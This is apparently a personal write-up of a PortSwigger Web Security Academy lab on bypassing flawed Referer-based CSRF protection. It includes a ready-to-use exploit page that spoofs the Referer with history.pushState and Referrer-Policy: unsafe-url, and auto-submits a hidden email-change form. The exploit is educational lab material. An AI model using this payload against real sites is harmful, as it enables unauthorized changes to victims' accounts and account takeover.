# Lab: CSRF with broken Referer validation
# https://portswigger.net/web-security/learning-paths/csrf/csrf-validation-of-referer-can-be-circumvented/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken#

```bash
# Update your email and check change-email from burp.
# Send it to repeater and try to change referer or remove referer.
# We see that when we change referer we get this error:

"Invalid referer header"
  
```
```bash
# This is our original referer
Referer: https://0a80000a04f064e783446f4f00240088.web-security-academy.net/my-account?id=wiener

Referer: https://0a80000a04f064e783446f4f00240088.web-security-academy.net

# When we turned it to this it still works.
# The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string. 
```
```bash

Referer: https://youwerehacked.com/?0a80000a04f064e783446f4f00240088.web-security-academy.net
# Works
```
```bash
history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")

# This will cause the Referer header in the generated request to contain the URL of the target site in the query string
```

```bash
# Open Exploit server and deliver this to victim.
# Paste this to head:

Referrer-Policy: unsafe-url

# Paste this to body:
<html>
<body>
<script>
	history.pushState("", "", "/?0a80000a04f064e783446f4f00240088.web-security-academy.net")
</script>
<form method="POST" action="https://0a80000a04f064e783446f4f00240088.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="var@gmail.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>

# you may encounter the "invalid Referer header" error again. This is because many browsers now strip the query string from the Referer header by default as a security measure.
# To override this behavior and ensure that the full URL is included in the request, go back to the exploit server and add Referrer-Policy: unsafe-url to the "Head" section
```
